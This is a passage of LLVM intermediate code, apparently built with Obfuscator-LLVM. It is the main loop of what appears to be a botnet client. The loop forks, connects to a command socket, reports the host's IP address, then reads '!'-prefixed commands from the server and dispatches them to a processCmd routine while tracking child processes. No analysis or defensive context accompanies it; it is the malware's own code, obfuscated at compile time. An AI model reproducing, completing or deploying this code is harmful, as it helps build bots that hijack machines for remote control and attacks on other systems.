  %67 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %68

; <label>:68:                                     ; preds = %74, %63
  %69 = call i32 @fork() #2
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %71, label %337

; <label>:71:                                     ; preds = %68
  %72 = call i32 @initConnection()
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %76

; <label>:74:                                     ; preds = %71
  %75 = call i32 @sleep(i32 5)
  br label %68

; <label>:76:                                     ; preds = %71
  %77 = load i32, i32* @mainCommSock, align 4
  %78 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %79 = call i8* @inet_ntoa(i32 %78) #2
  %80 = call i32 (i32, i8*, ...) @sockprintf(i32 %77, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i32 0, i32 0), i8* %79, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0))
  call void @ioctl_keepalive()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %81

; <label>:81:                                     ; preds = %335, %206, %170, %76
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %84 = call i32 @recvLine(i32 %82, i8* %83, i32 4096)
  store i32 %84, i32* %11, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %336

; <label>:86:                                     ; preds = %81
  store i32 0, i32* %12, align 4
  br label %87

; <label>:87:                                     ; preds = %158, %86
  %88 = load i32, i32* %12, align 4
  %89 = sext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %92, label %161

; <label>:92:                                     ; preds = %87
  %93 = load i32*, i32** @pids, align 8
  %94 = load i32, i32* %12, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @waitpid(i32 %97, i32* null, i32 1)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %157

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %12, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %14, align 4
  br label %103

; <label>:103:                                    ; preds = %119, %100
  %104 = load i32, i32* %14, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %107 = icmp ult i64 %105, %106
  br i1 %107, label %108, label %122

; <label>:108:                                    ; preds = %103
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %14, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %14, align 4
  %116 = sub i32 %115, 1
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %114, i64 %117
  store i32 %113, i32* %118, align 4
  br label %119

; <label>:119:                                    ; preds = %108
  %120 = load i32, i32* %14, align 4
  %121 = add i32 %120, 1
  store i32 %121, i32* %14, align 4
  br label %103

; <label>:122:                                    ; preds = %103
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 0, i32* %127, align 4
  %128 = load i64, i64* @numpids, align 8
  %129 = add i64 %128, -1
  store i64 %129, i64* @numpids, align 8
  %130 = load i64, i64* @numpids, align 8
  %131 = add i64 %130, 1
  %132 = mul i64 %131, 4
  %133 = call noalias i8* @malloc(i64 %132) #2
  %134 = bitcast i8* %133 to i32*
  store i32* %134, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %135

; <label>:135:                                    ; preds = %150, %122
  %136 = load i32, i32* %14, align 4
  %137 = zext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %153

; <label>:140:                                    ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %14, align 4
  %143 = zext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = load i32*, i32** %13, align 8
  %147 = load i32, i32* %14, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  store i32 %145, i32* %149, align 4
  br label %150

; <label>:150:                                    ; preds = %140
  %151 = load i32, i32* %14, align 4
  %152 = add i32 %151, 1
  store i32 %152, i32* %14, align 4
  br label %135

; <label>:153:                                    ; preds = %135
  %154 = load i32*, i32** @pids, align 8
  %155 = bitcast i32* %154 to i8*
  call void @free(i8* %155) #2
  %156 = load i32*, i32** %13, align 8
  store i32* %156, i32** @pids, align 8
  br label %157

; <label>:157:                                    ; preds = %153, %92
  br label %158

; <label>:158:                                    ; preds = %157
  %159 = load i32, i32* %12, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %12, align 4
  br label %87

; <label>:161:                                    ; preds = %87
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %163
  store i8 0, i8* %164, align 1
  %165 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %165)
  %166 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %167 = call i8* @strstr(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0)) #10
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %169 = icmp eq i8* %167, %168
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %161
  br label %81

; <label>:171:                                    ; preds = %161
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %173 = call i8* @strstr(i8* %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #10
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %175 = icmp eq i8* %173, %174
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %171
  call void @exit(i32 0) #14
  unreachable

; <label>:177:                                    ; preds = %171
  %178 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %178, i8** %15, align 8
  %179 = load i8*, i8** %15, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 33
  br i1 %182, label %183, label %335

; <label>:183:                                    ; preds = %177
  %184 = load i8*, i8** %15, align 8
  %185 = getelementptr inbounds i8, i8* %184, i64 1
  store i8* %185, i8** %16, align 8
  br label %186

; <label>:186:                                    ; preds = %198, %183
  %187 = load i8*, i8** %16, align 8
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp ne i32 %189, 32
  br i1 %190, label %191, label %196

; <label>:191:                                    ; preds = %186
  %192 = load i8*, i8** %16, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp ne i32 %194, 0
  br label %196

; <label>:196:                                    ; preds = %191, %186
  %197 = phi i1 [ false, %186 ], [ %195, %191 ]
  br i1 %197, label %198, label %201

; <label>:198:                                    ; preds = %196
  %199 = load i8*, i8** %16, align 8
  %200 = getelementptr inbounds i8, i8* %199, i32 1
  store i8* %200, i8** %16, align 8
  br label %186

; <label>:201:                                    ; preds = %196
  %202 = load i8*, i8** %16, align 8
  %203 = load i8, i8* %202, align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %207

; <label>:206:                                    ; preds = %201
  br label %81

; <label>:207:                                    ; preds = %201
  %208 = load i8*, i8** %16, align 8
  store i8 0, i8* %208, align 1
  %209 = load i8*, i8** %15, align 8
  %210 = getelementptr inbounds i8, i8* %209, i64 1
  store i8* %210, i8** %16, align 8
  %211 = load i8*, i8** %15, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @strlen(i8* %212) #10
  %214 = getelementptr inbounds i8, i8* %211, i64 %213
  %215 = getelementptr inbounds i8, i8* %214, i64 2
  store i8* %215, i8** %15, align 8
  br label %216

; <label>:216:                                    ; preds = %236, %207
  %217 = load i8*, i8** %15, align 8
  %218 = load i8*, i8** %15, align 8
  %219 = call i64 @strlen(i8* %218) #10
  %220 = sub i64 %219, 1
  %221 = getelementptr inbounds i8, i8* %217, i64 %220
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 10
  br i1 %224, label %234, label %225

; <label>:225:                                    ; preds = %216
  %226 = load i8*, i8** %15, align 8
  %227 = load i8*, i8** %15, align 8
  %228 = call i64 @strlen(i8* %227) #10
  %229 = sub i64 %228, 1
  %230 = getelementptr inbounds i8, i8* %226, i64 %229
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 13
  br label %234

; <label>:234:                                    ; preds = %225, %216
  %235 = phi i1 [ true, %216 ], [ %233, %225 ]
  br i1 %235, label %236, label %242

; <label>:236:                                    ; preds = %234
  %237 = load i8*, i8** %15, align 8
  %238 = load i8*, i8** %15, align 8
  %239 = call i64 @strlen(i8* %238) #10
  %240 = sub i64 %239, 1
  %241 = getelementptr inbounds i8, i8* %237, i64 %240
  store i8 0, i8* %241, align 1
  br label %216

; <label>:242:                                    ; preds = %234
  %243 = load i8*, i8** %15, align 8
  store i8* %243, i8** %17, align 8
  br label %244

; <label>:244:                                    ; preds = %256, %242
  %245 = load i8*, i8** %15, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 32
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %244
  %250 = load i8*, i8** %15, align 8
  %251 = load i8, i8* %250, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp ne i32 %252, 0
  br label %254

; <label>:254:                                    ; preds = %249, %244
  %255 = phi i1 [ false, %244 ], [ %253, %249 ]
  br i1 %255, label %256, label %259

; <label>:256:                                    ; preds = %254
  %257 = load i8*, i8** %15, align 8
  %258 = getelementptr inbounds i8, i8* %257, i32 1
  store i8* %258, i8** %15, align 8
  br label %244

; <label>:259:                                    ; preds = %254
  %260 = load i8*, i8** %15, align 8
  store i8 0, i8* %260, align 1
  %261 = load i8*, i8** %15, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %15, align 8
  %263 = load i8*, i8** %17, align 8
  store i8* %263, i8** %18, align 8
  br label %264

; <label>:264:                                    ; preds = %268, %259
  %265 = load i8*, i8** %18, align 8
  %266 = load i8, i8* %265, align 1
  %267 = icmp ne i8 %266, 0
  br i1 %267, label %268, label %277

; <label>:268:                                    ; preds = %264
  %269 = load i8*, i8** %18, align 8
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = call i32 @toupper(i32 %271) #10
  %273 = trunc i32 %272 to i8
  %274 = load i8*, i8** %18, align 8
  store i8 %273, i8* %274, align 1
  %275 = load i8*, i8** %18, align 8
  %276 = getelementptr inbounds i8, i8* %275, i32 1
  store i8* %276, i8** %18, align 8
  br label %264

; <label>:277:                                    ; preds = %264
  store i32 1, i32* %20, align 4
  %278 = load i8*, i8** %15, align 8
  %279 = call i8* @strtok(i8* %278, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %279, i8** %21, align 8
  %280 = load i8*, i8** %17, align 8
  %281 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %280, i8** %281, align 16
  br label %282

; <label>:282:                                    ; preds = %313, %277
  %283 = load i8*, i8** %21, align 8
  %284 = icmp ne i8* %283, null
  br i1 %284, label %285, label %315

; <label>:285:                                    ; preds = %282
  %286 = load i8*, i8** %21, align 8
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i32
  %289 = icmp ne i32 %288, 10
  br i1 %289, label %290, label %313

; <label>:290:                                    ; preds = %285
  %291 = load i8*, i8** %21, align 8
  %292 = call i64 @strlen(i8* %291) #10
  %293 = add i64 %292, 1
  %294 = call noalias i8* @malloc(i64 %293) #2
  %295 = load i32, i32* %20, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %296
  store i8* %294, i8** %297, align 8
  %298 = load i32, i32* %20, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = load i8*, i8** %21, align 8
  %303 = call i64 @strlen(i8* %302) #10
  %304 = add i64 %303, 1
  call void @llvm.memset.p0i8.i64(i8* %301, i8 0, i64 %304, i32 1, i1 false)
  %305 = load i32, i32* %20, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %306
  %308 = load i8*, i8** %307, align 8
  %309 = load i8*, i8** %21, align 8
  %310 = call i8* @strcpy(i8* %308, i8* %309) #2
  %311 = load i32, i32* %20, align 4
  %312 = add nsw i32 %311, 1
  store i32 %312, i32* %20, align 4
  br label %313

; <label>:313:                                    ; preds = %290, %285
  %314 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %314, i8** %21, align 8
  br label %282

; <label>:315:                                    ; preds = %282
  %316 = load i32, i32* %20, align 4
  %317 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %316, i8** %317)
  %318 = load i32, i32* %20, align 4
  %319 = icmp sgt i32 %318, 1
  br i1 %319, label %320, label %334

; <label>:320:                                    ; preds = %315
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %321

; <label>:321:                                    ; preds = %330, %320
  %322 = load i32, i32* %22, align 4
  %323 = load i32, i32* %20, align 4
  %324 = icmp slt i32 %322, %323
  br i1 %324, label %325, label %333

; <label>:325:                                    ; preds = %321
  %326 = load i32, i32* %22, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %327
  %329 = load i8*, i8** %328, align 8
  call void @free(i8* %329) #2
  br label %330

; <label>:330:                                    ; preds = %325
  %331 = load i32, i32* %22, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %22, align 4
  br label %321

; <label>:333:                                    ; preds = %321
  br label %334

; <label>:334:                                    ; preds = %333, %315
  br label %335

; <label>:335:                                    ; preds = %334, %177
  br label %81

; <label>:336:                                    ; preds = %81
  br label %337

; <label>:337:                                    ; preds = %336, %68
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i32 @setuid(i32) #4

; Function Attrs: nounwind
declare i32 @seteuid(i32) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146710168}
!2 = !{i32 -2146709460}
!3 = !{i32 -2146708763}
